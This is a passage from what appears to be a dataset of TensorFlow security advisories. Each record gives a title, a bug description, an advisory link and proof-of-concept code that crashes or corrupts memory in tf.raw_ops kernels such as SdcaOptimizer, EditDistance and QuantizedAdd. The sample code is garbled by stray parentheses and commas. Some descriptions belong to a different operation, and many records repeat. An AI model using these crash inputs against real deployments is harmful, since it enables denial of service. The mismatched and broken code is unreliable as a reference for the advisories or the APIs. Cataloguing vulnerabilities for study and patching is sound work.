    "Sample Code": "input = tf.zeros([1, 1, 1], dtype=tf.int32)\nseq_lengths = tf.constant([0], shape=[1], dtype=tf.int32)\n\ntf.raw_ops.ReverseSequence(\n    (\n    input=input, seq_lengths=seq_lengths, seq_dim=-2, batch_dim=0)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6qgm-fv6v-rfpv",
    "API Signature": "tf.raw_ops.ReverseSequence(\n    input, seq_lengths, seq_dim, batch_dim=0, name=None\n)\n"
  },
  {
    "Title": "\n        Overflow/denial of service in `tf.raw_ops.ReverseSequence`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.ReverseSequence  allows for stack overflow and/or  CHECK -fail based denial of service.",
    "Sample Code": "input = tf.zeros([1, 1, 1], dtype=tf.int32)\nseq_lengths = tf.constant([0], shape=[1], dtype=tf.int32)\n\ntf.raw_ops.ReverseSequence(\n    (\n    input=input, seq_lengths=seq_lengths, seq_dim=-2, batch_dim=0)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6qgm-fv6v-rfpv",
    "API Signature": "tf.raw_ops.ReverseSequence(\n    input, seq_lengths, seq_dim, batch_dim=0, name=None\n)\n"
  },
  {
    "Title": "\n        Reference binding to nullptr in `SdcaOptimizer`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.SdcaOptimizer  triggers undefined behavior due to dereferencing a null pointer:",
    "Sample Code": "sparse_example_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_feature_indices = [tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_feature_values = []\n\ndense_features = []\ndense_weights = []\n\nexample_weights = tf.constant((0.0), dtype=tf.float32)\nexample_labels = tf.constant((0.0), dtype=tf.float32)\n\nsparse_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_weights = [tf.constant((0.0), dtype=tf.float32), tf.constant((0.0), dtype=tf.float32)]\n  \nexample_state_data = tf.constant([0.0, 0.0, 0.0, 0.0], shape=[1, 4], dtype=tf.float32)\n  \ntf.raw_ops.SdcaOptimizer(\n  sparse_example_indices=sparse_example_indices,\n  sparse_feature_indices=sparse_feature_indices,\n  sparse_feature_values=sparse_feature_values, dense_features=dense_features,\n  example_weights=example_weights, example_labels=example_labels, \n  sparse_indices=sparse_indices, sparse_weights=sparse_weights, \n  dense_weights=dense_weights, example_state_data=example_state_data,\n  loss_type=\"logistic_loss\", l1=0.0, l2=0.0, num_loss_partitions=1,\n  ,\n  num_inner_iterations=1, adaptative=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5gqf-456p-4836",
    "API Signature": "tf.raw_ops.SdcaOptimizer(\n    sparse_example_indices,\n    sparse_feature_indices,\n    sparse_feature_values,\n    dense_features,\n    example_weights,\n    example_labels,\n    sparse_indices,\n    sparse_weights,\n    dense_weights,\n    example_state_data,\n    loss_type,\n    l1,\n    l2,\n    num_loss_partitions,\n    num_inner_iterations,\n    adaptative=True,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Reference binding to nullptr in `SdcaOptimizer`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.SdcaOptimizer  triggers undefined behavior due to dereferencing a null pointer:",
    "Sample Code": "sparse_example_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_feature_indices = [tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_feature_values = []\n\ndense_features = []\ndense_weights = []\n\nexample_weights = tf.constant((0.0), dtype=tf.float32)\nexample_labels = tf.constant((0.0), dtype=tf.float32)\n\nsparse_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_weights = [tf.constant((0.0), dtype=tf.float32), tf.constant((0.0), dtype=tf.float32)]\n  \nexample_state_data = tf.constant([0.0, 0.0, 0.0, 0.0], shape=[1, 4], dtype=tf.float32)\n  \ntf.raw_ops.SdcaOptimizer(\n  sparse_example_indices=sparse_example_indices,\n  sparse_feature_indices=sparse_feature_indices,\n  sparse_feature_values=sparse_feature_values, dense_features=dense_features,\n  example_weights=example_weights, example_labels=example_labels, \n  sparse_indices=sparse_indices, sparse_weights=sparse_weights, \n  dense_weights=dense_weights, example_state_data=example_state_data,\n  loss_type=\"logistic_loss\", l1=0.0, l2=0.0, num_loss_partitions=1,\n  ,\n  num_inner_iterations=1, adaptative=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5gqf-456p-4836",
    "API Signature": "tf.raw_ops.SdcaOptimizer(\n    sparse_example_indices,\n    sparse_feature_indices,\n    sparse_feature_values,\n    dense_features,\n    example_weights,\n    example_labels,\n    sparse_indices,\n    sparse_weights,\n    dense_weights,\n    example_state_data,\n    loss_type,\n    l1,\n    l2,\n    num_loss_partitions,\n    num_inner_iterations,\n    adaptative=True,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Memory corruption in `DrawBoundingBoxesV2`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.MaxPoolGradWithArgmax  can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:",
    "Sample Code": "images = tf.fill([10, 96, 0, 1], 0.)\nboxes = tf.fill([10, 53, 0], 0.)\ncolors = tf.fill([0, 1], 0.)\n\n)\n\ntf.raw_ops.DrawBoundingBoxesV2(images=images, boxes=boxes, colors=colors)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-whr9-vfh2-7hm6",
    "API Signature": "tf.raw_ops.DrawBoundingBoxesV2(\n    images, boxes, colors, name=None\n)\n"
  },
  {
    "Title": "\n        Heap out of bounds read in `RequantizationRange`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.MaxPoolGradWithArgmax  can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:",
    "Sample Code": "input = tf.constant([1], shape=[1], dtype=tf.qint32) \ninput_max = tf.constant([], dtype=tf.float32)\ninput_min = tf.constant([], dtype=tf.float32)\n\n)\n\ntf.raw_ops.RequantizationRange(input=input, input_min=input_min, input_max=input_max)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-3h8m-483j-7xxm",
    "API Signature": "tf.raw_ops.RequantizationRange(\n    input, input_min, input_max, name=None\n)\n"
  },
  {
    "Title": "\n        Heap out of bounds read in `MaxPoolGradWithArgmax`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.MaxPoolGradWithArgmax  can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:",
    "Sample Code": "input = tf.constant([10.0, 10.0, 10.0], shape=[1, 1, 3, 1], dtype=tf.float32)\ngrad = tf.constant([10.0, 10.0, 10.0, 10.0], shape=[1, 1, 1, 4], dtype=tf.float32)\nargmax = tf.constant([1], shape=[1], dtype=tf.int64)\nksize = [1, 1, 1, 1]\nstrides = [1, 1, 1, 1]\n  \ntf.raw_ops.MaxPoolGradWithArgmax(\n  input=input, grad=grad, argmax=argmax, ksize=ksize, strides=strides,\n  ,\n  padding='SAME', include_batch_in_index=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-545v-42p7-98fq",
    "API Signature": "tf.raw_ops.MaxPoolGradWithArgmax(\n    input,\n    grad,\n    argmax,\n    ksize,\n    strides,\n    padding,\n    include_batch_in_index=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Lack of validation in `SparseDenseCwiseMul`\n      ",
    "Bug description": "Due to lack of validation in  tf.raw_ops.SparseDenseCwiseMul , an attacker can trigger denial of service via  CHECK -fails or accesses to outside the bounds of heap allocated data:",
    "Sample Code": "indices = tf.constant([], shape=[10, 0], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\nshape = tf.constant([0, 0], shape=[2], dtype=tf.int64)\ndense = tf.constant([], shape=[0], dtype=tf.int64)\n  \ntf.raw_ops.SparseDenseCwiseMul(\n    (\n    sp_indices=indices, sp_values=values, sp_shape=shape, dense=dense)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wp3c-xw9g-gpcg",
    "API Signature": "tf.raw_ops.SparseDenseCwiseMul(\n    sp_indices, sp_values, sp_shape, dense, name=None\n)\n"
  },
  {
    "Title": "\n        Reference binding to null in `ParameterizedTruncatedNormal`\n      ",
    "Bug description": "An attacker can trigger undefined behavior by binding to null pointer in  tf.raw_ops.ParameterizedTruncatedNormal :",
    "Sample Code": "shape = tf.constant([], shape=[0], dtype=tf.int32)\nmeans = tf.constant((1), dtype=tf.float32)\nstdevs = tf.constant((1), dtype=tf.float32)\nminvals = tf.constant((1), dtype=tf.float32)\nmaxvals = tf.constant((1), dtype=tf.float32)\n  \ntf.raw_ops.ParameterizedTruncatedNormal(\n  (\n  shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4p4p-www8-8fv9",
    "API Signature": "tf.raw_ops.ParameterizedTruncatedNormal(\n    shape, means, stdevs, minvals, maxvals, seed=0, seed2=0, name=None\n)\n"
  },
  {
    "Title": "\n        Null pointer dereference in `SparseFillEmptyRows`\n      ",
    "Bug description": "An attacker can trigger a null pointer dereference in the implementation of  tf.raw_ops.SparseFillEmptyRows :",
    "Sample Code": "indices = tf.constant([], shape=[0, 0], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\ndense_shape = tf.constant([], shape=[0], dtype=tf.int64)\ndefault_value = 0\n    \ntf.raw_ops.SparseFillEmptyRows(\n    indices=indices, values=values, dense_shape=dense_shape,\n    ,\n    default_value=default_value)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r6pg-pjwc-j585",
    "API Signature": "tf.raw_ops.SparseFillEmptyRows(\n    indices, values, dense_shape, default_value, name=None\n)\n"
  },
  {
    "Title": "\n        Null pointer dereference in `EditDistance`\n      ",
    "Bug description": "An attacker can trigger a null pointer dereference in the implementation of  tf.raw_ops.EditDistance :",
    "Sample Code": "hypothesis_indices = tf.constant([247, 247, 247], shape=[1, 3], dtype=tf.int64)\nhypothesis_values = tf.constant([-9.9999], shape=[1], dtype=tf.float32)\nhypothesis_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)\ntruth_indices = tf.constant([], shape=[0, 3], dtype=tf.int64)\ntruth_values = tf.constant([], shape=[0], dtype=tf.float32)\ntruth_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)\n\ntf.raw_ops.EditDistance(\n    hypothesis_indices=hypothesis_indices, hypothesis_values=hypothesis_values,\n    hypothesis_shape=hypothesis_shape, truth_indices=truth_indices,\n    ,\n    truth_values=truth_values, truth_shape=truth_shape, normalize=True)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75f6-78jr-4656",
    "API Signature": "tf.raw_ops.EditDistance(\n    hypothesis_indices,\n    hypothesis_values,\n    hypothesis_shape,\n    truth_indices,\n    truth_values,\n    truth_shape,\n    normalize=True,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Null pointer dereference in `EditDistance`\n      ",
    "Bug description": "An attacker can trigger a null pointer dereference in the implementation of  tf.raw_ops.EditDistance :",
    "Sample Code": "hypothesis_indices = tf.constant([247, 247, 247], shape=[1, 3], dtype=tf.int64)\nhypothesis_values = tf.constant([-9.9999], shape=[1], dtype=tf.float32)\nhypothesis_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)\ntruth_indices = tf.constant([], shape=[0, 3], dtype=tf.int64)\ntruth_values = tf.constant([], shape=[0], dtype=tf.float32)\ntruth_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)\n\ntf.raw_ops.EditDistance(\n    hypothesis_indices=hypothesis_indices, hypothesis_values=hypothesis_values,\n    hypothesis_shape=hypothesis_shape, truth_indices=truth_indices,\n    ,\n    truth_values=truth_values, truth_shape=truth_shape, normalize=True)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75f6-78jr-4656",
    "API Signature": "tf.raw_ops.EditDistance(\n    hypothesis_indices,\n    hypothesis_values,\n    hypothesis_shape,\n    truth_indices,\n    truth_values,\n    truth_shape,\n    normalize=True,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK`-fail in `tf.raw_ops.RFFT`\n      ",
    "Bug description": "An attacker can cause a denial of service by exploiting a  CHECK -failure coming from the implementation of  tf.raw_ops.RFFT :",
    "Sample Code": "inputs = tf.constant([1], shape=[1], dtype=tf.float32)\nfft_length = tf.constant([0], shape=[1], dtype=tf.int32)\n\n)\n\ntf.raw_ops.RFFT(input=inputs, fft_length=fft_length)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-ph87-fvjr-v33w",
    "API Signature": "tf.raw_ops.RFFT(\n    input,\n    fft_length,\n    Tcomplex=tf.dtypes.complex64,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK`-fail in `tf.raw_ops.IRFFT`\n      ",
    "Bug description": "An attacker can cause a denial of service by exploiting a  CHECK -failure coming from the implementation of  tf.raw_ops.IRFFT :",
    "Sample Code": "values = [-10.0] * 130\nvalues[0] = -9.999999999999995\ninputs = tf.constant(values, shape=[10, 13], dtype=tf.float32)\ninputs = tf.cast(inputs, dtype=tf.complex64)\nfft_length = tf.constant([0], shape=[1], dtype=tf.int32)\n\n)\n\ntf.raw_ops.IRFFT(input=inputs, fft_length=fft_length)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-36vm-xw34-x4pj",
    "API Signature": "tf.raw_ops.IRFFT(\n    input,\n    fft_length,\n    Treal=tf.dtypes.float32,\n    name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK`-fail in `LoadAndRemapMatrix` \n      ",
    "Bug description": "An attacker can cause a denial of service by exploiting a  CHECK -failure coming from  tf.raw_ops.LoadAndRemapMatrix :",
    "Sample Code": "ckpt_path = tf.constant([], shape=[0], dtype=tf.string)\nold_tensor_name = tf.constant(\"\")\nrow_remapping = tf.constant([], shape=[0], dtype=tf.int64)\ncol_remapping = tf.constant([1], shape=[1], dtype=tf.int64)\ninitializing_values = tf.constant(1.0)\n\ntf.raw_ops.LoadAndRemapMatrix(\n    ckpt_path=ckpt_path, old_tensor_name=old_tensor_name,\n    row_remapping=row_remapping, col_remapping=col_remapping,\n    ,\n    initializing_values=initializing_values, num_rows=0, num_cols=1)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gvm4-h8j3-rjrq",
    "API Signature": "tf.raw_ops.LoadAndRemapMatrix(\n    ckpt_path,\n    old_tensor_name,\n    row_remapping,\n    col_remapping,\n    initializing_values,\n    num_rows,\n    num_cols,\n    max_rows_in_memory=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB access in unicode ops\n      ",
    "Bug description": "An attacker can access data outside of bounds of heap allocated array in  tf.raw_ops.UnicodeEncode :",
    "Sample Code": "input_values = tf.constant([58], shape=[1], dtype=tf.int32)\ninput_splits = tf.constant([[81, 101, 0]], shape=[3], dtype=tf.int32)\noutput_encoding = \"UTF-8\"\n\ntf.raw_ops.UnicodeEncode(\n    input_values=input_values, input_splits=input_splits,\n    ,\n    output_encoding=output_encoding)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-59q2-x2qc-4c97",
    "API Signature": "tf.raw_ops.UnicodeEncode(\n    input_values,\n    input_splits,\n    output_encoding,\n    errors='replace',\n    replacement_char=65533,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB access in unicode ops\n      ",
    "Bug description": "An attacker can access data outside of bounds of heap allocated array in  tf.raw_ops.UnicodeEncode :",
    "Sample Code": "input_values = tf.constant([58], shape=[1], dtype=tf.int32)\ninput_splits = tf.constant([[81, 101, 0]], shape=[3], dtype=tf.int32)\noutput_encoding = \"UTF-8\"\n\ntf.raw_ops.UnicodeEncode(\n    input_values=input_values, input_splits=input_splits,\n    ,\n    output_encoding=output_encoding)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-59q2-x2qc-4c97",
    "API Signature": "tf.raw_ops.UnicodeEncode(\n    input_values,\n    input_splits,\n    output_encoding,\n    errors='replace',\n    replacement_char=65533,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow in `SparseSplit`\n      ",
    "Bug description": "An attacker can cause a heap buffer overflow in  tf.raw_ops.SparseSplit :",
    "Sample Code": "shape_dims = tf.constant(0, dtype=tf.int64)\nindices = tf.ones([1, 1], dtype=tf.int64)\nvalues = tf.ones([1], dtype=tf.int64)\nshape = tf.ones([1], dtype=tf.int64)\n\ntf.raw_ops.SparseSplit(\n    split_dim=shape_dims, indices=indices, values=values,\n    ,\n    shape=shape, num_split=1)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mqh2-9wrp-vx84",
    "API Signature": "tf.raw_ops.SparseSplit(\n    split_dim, indices, values, shape, num_split, name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `Reverse`\n      ",
    "Bug description": "An attacker can cause a denial of service via a FPE runtime error in  tf.raw_ops.Reverse :",
    "Sample Code": "tensor_input = tf.constant([], shape=[0, 1, 1], dtype=tf.int32)\ndims = tf.constant([False, True, False], shape=[3], dtype=tf.bool)\n\n)\n\ntf.raw_ops.Reverse(tensor=tensor_input, dims=dims)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fxqh-cfjm-fp93",
    "API Signature": "tf.raw_ops.Reverse(\n    tensor, dims, name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `SparseMatMul`\n      ",
    "Bug description": "An attacker can cause a denial of service via a FPE runtime error in  tf.raw_ops.SparseMatMul :",
    "Sample Code": "a = tf.constant([100.0, 100.0, 100.0, 100.0], shape=[2, 2], dtype=tf.float32)\nb = tf.constant([], shape=[0, 2], dtype=tf.float32)\n\ntf.raw_ops.SparseMatMul(\n    a=a, b=b, transpose_a=True, transpose_b=True,\n    ,\n    a_is_sparse=True, b_is_sparse=True)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xw93-v57j-fcgh",
    "API Signature": "tf.raw_ops.SparseMatMul(\n    a,\n    b,\n    transpose_a=False,\n    transpose_b=False,\n    a_is_sparse=False,\n    b_is_sparse=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `FusedBatchNorm`\n      ",
    "Bug description": "An attacker can cause a denial of service via a FPE runtime error in  tf.raw_ops.FusedBatchNorm :",
    "Sample Code": "x = tf.constant([], shape=[1, 1, 1, 0], dtype=tf.float32)\nscale = tf.constant([], shape=[0], dtype=tf.float32)\noffset = tf.constant([], shape=[0], dtype=tf.float32)\nmean = tf.constant([], shape=[0], dtype=tf.float32)\nvariance = tf.constant([], shape=[0], dtype=tf.float32)\nepsilon = 0.0\nexponential_avg_factor = 0.0\ndata_format = \"NHWC\"\nis_training = False\n\ntf.raw_ops.FusedBatchNorm(\n    x=x, scale=scale, offset=offset, mean=mean,\n    variance=variance, epsilon=epsilon,\n    exponential_avg_factor=exponential_avg_factor,\n    ,\n    data_format=data_format, is_training=is_training)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r35g-4525-29fq",
    "API Signature": "tf.raw_ops.FusedBatchNorm(\n    x,\n    scale,\n    offset,\n    mean,\n    variance,\n    epsilon=0.0001,\n    exponential_avg_factor=1,\n    data_format='NHWC',\n    is_training=True,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `DenseCountSparseOutput`\n      ",
    "Bug description": "An attacker can cause a denial of service via a FPE runtime error in  tf.raw_ops.DenseCountSparseOutput :",
    "Sample Code": "values = tf.constant([], shape=[0, 0], dtype=tf.int64)\nweights = tf.constant([])\n\ntf.raw_ops.DenseCountSparseOutput(\n  values=values, weights=weights,\n  ,\n  minlength=-1, maxlength=58, binary_output=True)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qg48-85hg-mqc5",
    "API Signature": "tf.raw_ops.DenseCountSparseOutput(\n    values, weights, binary_output, minlength=-1, maxlength=-1, name=None\n)\n"
  },
  {
    "Title": "\n        `CHECK`-failure in `UnsortedSegmentJoin`\n      ",
    "Bug description": "An attacker can cause a denial of service by controlling the values of  num_segments  tensor argument for  UnsortedSegmentJoin :",
    "Sample Code": "inputs = tf.constant([], dtype=tf.string)\nsegment_ids = tf.constant([], dtype=tf.int32)\nnum_segments = tf.constant([], dtype=tf.int32)\nseparator = ''\n\ntf.raw_ops.UnsortedSegmentJoin(\n  inputs=inputs, segment_ids=segment_ids,\n  ,\n  num_segments=num_segments, separator=separator)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jhq9-wm9m-cf89",
    "API Signature": "tf.raw_ops.UnsortedSegmentJoin(\n    inputs, segment_ids, num_segments, separator='', name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB in `QuantizeAndDequantizeV3`\n      ",
    "Bug description": "An attacker can read data outside of bounds of heap allocated buffer in  tf.raw_ops.QuantizeAndDequantizeV3 :",
    "Sample Code": "tf.raw_ops.QuantizeAndDequantizeV3(\n  input=[2.5,2.5], input_min=[0,0], input_max=[1,1], num_bits=[30],\n  ],\n  signed_input=False, range_given=False, narrow_range=False, axis=3)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h9px-9vqg-222h",
    "API Signature": "tf.raw_ops.QuantizeAndDequantizeV3(\n    input,\n    input_min,\n    input_max,\n    num_bits,\n    signed_input=True,\n    range_given=True,\n    narrow_range=False,\n    axis=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        OOB read in `MatrixTriangularSolve`\n      ",
    "Bug description": "The implementation of  MatrixTriangularSolve  fails to terminate kernel execution if one validation condition fails:",
    "Sample Code": "import numpy as np\n\nmatrix_array = np.array([])\nmatrix_tensor = tf.convert_to_tensor(np.reshape(matrix_array,(1,0)),dtype=tf.float32)\nrhs_array = np.array([])\nrhs_tensor = tf.convert_to_tensor(np.reshape(rhs_array,(0,1)),dtype=tf.float32)\n\n)\n\ntf.raw_ops.MatrixTriangularSolve(matrix=matrix_tensor,rhs=rhs_tensor,lower=False,adjoint=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vqw6-72r7-fgw7",
    "API Signature": "tf.raw_ops.MatrixTriangularSolve(\n    matrix, rhs, lower=True, adjoint=False, name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `FractionalAvgPool`\n      ",
    "Bug description": "An attacker can cause a runtime division by zero error and denial of service in  tf.raw_ops.FractionalAvgPool :",
    "Sample Code": "value = tf.constant([60], shape=[1, 1, 1, 1], dtype=tf.int32)\npooling_ratio = [1.0, 1.0000014345305555, 1.0, 1.0]\npseudo_random = False\noverlapping = False\ndeterministic = False\nseed = 0\nseed2 = 0\n\ntf.raw_ops.FractionalAvgPool(\n  value=value, pooling_ratio=pooling_ratio, pseudo_random=pseudo_random,\n  ,\n  overlapping=overlapping, deterministic=deterministic, seed=seed, seed2=seed2)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f78g-q7r4-9wcv",
    "API Signature": "tf.raw_ops.FractionalAvgPool(\n    value,\n    pooling_ratio,\n    pseudo_random=False,\n    overlapping=False,\n    deterministic=False,\n    seed=0,\n    seed2=0,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `QuantizedAdd`\n      ",
    "Bug description": "An attacker can cause a runtime division by zero error and denial of service in  tf.raw_ops.QuantizedAdd :",
    "Sample Code": "x = tf.constant([68, 228], shape=[2, 1], dtype=tf.quint8)\ny = tf.constant([], shape=[2, 0], dtype=tf.quint8)\n\nmin_x = tf.constant(10.723421015884028)\nmax_x = tf.constant(15.19578006631113)\nmin_y = tf.constant(-5.539003866682977)\nmax_y = tf.constant(42.18819949559947)\n\n)\n\ntf.raw_ops.QuantizedAdd(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x83m-p7pv-ch8v",
    "API Signature": "tf.raw_ops.QuantizedAdd(\n    x,\n    y,\n    min_x,\n    max_x,\n    min_y,\n    max_y,\n    Toutput=tf.dtypes.qint32,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `QuantizedBatchNormWithGlobalNormalization`\n      ",
    "Bug description": "An attacker can cause a runtime division by zero error and denial of service in  tf.raw_ops.QuantizedBatchNormWithGlobalNormalization :",
    "Sample Code": "t = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.quint8)\nt_min = tf.constant(-10.0, dtype=tf.float32)\nt_max = tf.constant(-10.0, dtype=tf.float32)\nm = tf.constant([], shape=[0], dtype=tf.quint8)\nm_min = tf.constant(-10.0, dtype=tf.float32)\nm_max = tf.constant(-10.0, dtype=tf.float32)\nv = tf.constant([], shape=[0], dtype=tf.quint8)\nv_min = tf.constant(-10.0, dtype=tf.float32)\nv_max = tf.constant(-10.0, dtype=tf.float32)\nbeta = tf.constant([], shape=[0], dtype=tf.quint8)\nbeta_min = tf.constant(-10.0, dtype=tf.float32)\nbeta_max = tf.constant(-10.0, dtype=tf.float32)\ngamma = tf.constant([], shape=[0], dtype=tf.quint8)\ngamma_min = tf.constant(-10.0, dtype=tf.float32)\ngamma_max = tf.constant(-10.0, dtype=tf.float32)\n\ntf.raw_ops.QuantizedBatchNormWithGlobalNormalization(\n  t=t, t_min=t_min, t_max=t_max, m=m, m_min=m_min, m_max=m_max,\n  v=v, v_min=v_min, v_max=v_max, beta=beta, beta_min=beta_min,\n  beta_max=beta_max, gamma=gamma, gamma_min=gamma_min,\n  gamma_max=gamma_max, out_type=tf.qint32,\n  ,\n  variance_epsilon=0.1, scale_after_normalization=True)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p45v-v4pw-77jr",
    "API Signature": "tf.raw_ops.QuantizedBatchNormWithGlobalNormalization(\n    t,\n    t_min,\n    t_max,\n    m,\n    m_min,\n    m_max,\n    v,\n    v_min,\n    v_max,\n    beta,\n    beta_min,\n    beta_max,\n    gamma,\n    gamma_min,\n    gamma_max,\n    out_type,\n    variance_epsilon,\n    scale_after_normalization,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `QuantizedBatchNormWithGlobalNormalization`\n      ",
    "Bug description": "An attacker can cause a runtime division by zero error and denial of service in  tf.raw_ops.QuantizedBatchNormWithGlobalNormalization :",
    "Sample Code": "t = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.quint8)\nt_min = tf.constant(-10.0, dtype=tf.float32)\nt_max = tf.constant(-10.0, dtype=tf.float32)\nm = tf.constant([], shape=[0], dtype=tf.quint8)\nm_min = tf.constant(-10.0, dtype=tf.float32)\nm_max = tf.constant(-10.0, dtype=tf.float32)\nv = tf.constant([], shape=[0], dtype=tf.quint8)\nv_min = tf.constant(-10.0, dtype=tf.float32)\nv_max = tf.constant(-10.0, dtype=tf.float32)\nbeta = tf.constant([], shape=[0], dtype=tf.quint8)\nbeta_min = tf.constant(-10.0, dtype=tf.float32)\nbeta_max = tf.constant(-10.0, dtype=tf.float32)\ngamma = tf.constant([], shape=[0], dtype=tf.quint8)\ngamma_min = tf.constant(-10.0, dtype=tf.float32)\ngamma_max = tf.constant(-10.0, dtype=tf.float32)\n\ntf.raw_ops.QuantizedBatchNormWithGlobalNormalization(\n  t=t, t_min=t_min, t_max=t_max, m=m, m_min=m_min, m_max=m_max,\n  v=v, v_min=v_min, v_max=v_max, beta=beta, beta_min=beta_min,\n  beta_max=beta_max, gamma=gamma, gamma_min=gamma_min,\n  gamma_max=gamma_max, out_type=tf.qint32,\n  ,\n  variance_epsilon=0.1, scale_after_normalization=True)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p45v-v4pw-77jr",
    "API Signature": "tf.raw_ops.QuantizedBatchNormWithGlobalNormalization(\n    t,\n    t_min,\n    t_max,\n    m,\n    m_min,\n    m_max,\n    v,\n    v_min,\n    v_max,\n    beta,\n    beta_min,\n    beta_max,\n    gamma,\n    gamma_min,\n    gamma_max,\n    out_type,\n    variance_epsilon,\n    scale_after_normalization,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `QuantizedBatchNormWithGlobalNormalization`\n      ",
    "Bug description": "An attacker can cause a runtime division by zero error and denial of service in  tf.raw_ops.QuantizedBatchNormWithGlobalNormalization :",
    "Sample Code": "t = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.quint8)\nt_min = tf.constant(-10.0, dtype=tf.float32)\nt_max = tf.constant(-10.0, dtype=tf.float32)\nm = tf.constant([], shape=[0], dtype=tf.quint8)\nm_min = tf.constant(-10.0, dtype=tf.float32)\nm_max = tf.constant(-10.0, dtype=tf.float32)\nv = tf.constant([], shape=[0], dtype=tf.quint8)\nv_min = tf.constant(-10.0, dtype=tf.float32)\nv_max = tf.constant(-10.0, dtype=tf.float32)\nbeta = tf.constant([], shape=[0], dtype=tf.quint8)\nbeta_min = tf.constant(-10.0, dtype=tf.float32)\nbeta_max = tf.constant(-10.0, dtype=tf.float32)\ngamma = tf.constant([], shape=[0], dtype=tf.quint8)\ngamma_min = tf.constant(-10.0, dtype=tf.float32)\ngamma_max = tf.constant(-10.0, dtype=tf.float32)\n\ntf.raw_ops.QuantizedBatchNormWithGlobalNormalization(\n  t=t, t_min=t_min, t_max=t_max, m=m, m_min=m_min, m_max=m_max,\n  v=v, v_min=v_min, v_max=v_max, beta=beta, beta_min=beta_min,\n  beta_max=beta_max, gamma=gamma, gamma_min=gamma_min,\n  gamma_max=gamma_max, out_type=tf.qint32,\n  ,\n  variance_epsilon=0.1, scale_after_normalization=True)",
